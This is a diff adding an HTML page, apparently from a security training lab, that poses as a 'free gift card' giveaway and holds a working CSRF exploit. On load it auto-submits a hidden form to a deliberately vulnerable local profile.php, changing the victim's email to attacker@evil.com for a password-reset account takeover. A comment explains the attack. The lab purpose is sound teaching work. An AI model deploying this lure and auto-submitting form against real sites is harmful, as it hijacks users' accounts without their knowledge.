@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Prize Giveaway - Click to Claim!</title>
+</head>
+<body>
+    <h1>Congratulations! You've won a free gift card!</h1>
+    <p>Click below to claim your reward.</p>
+
+    <!--
+        CSRF ATTACK PAGE
+        ============================================================
+        This page is attacker-controlled and hosted completely
+        separately from securecart.com (e.g. evil-site.com).
+        It silently submits a form to the victim's SecureCart
+        profile.php the instant the page loads -- no click needed.
+
+        If the victim is logged into SecureCart in the same browser
+        (has a valid session cookie), the browser automatically
+        attaches that cookie to this cross-site POST request, and
+        profile.php has no CSRF token check to reject it.
+
+        Result: the victim's email gets silently changed to
+        attacker@evil.com without their knowledge or consent --
+        which the attacker can then use for a password-reset
+        account takeover.
+        ============================================================
+    -->
+    <form id="csrf-form" action="http://localhost/securecart/vulnerable/profile.php" method="POST">
+        <input type="hidden" name="new_email" value="attacker@evil.com">
+    </form>
+
+    <script>
+        document.getElementById('csrf-form').submit();
+    </script>
+</body>
+</html>
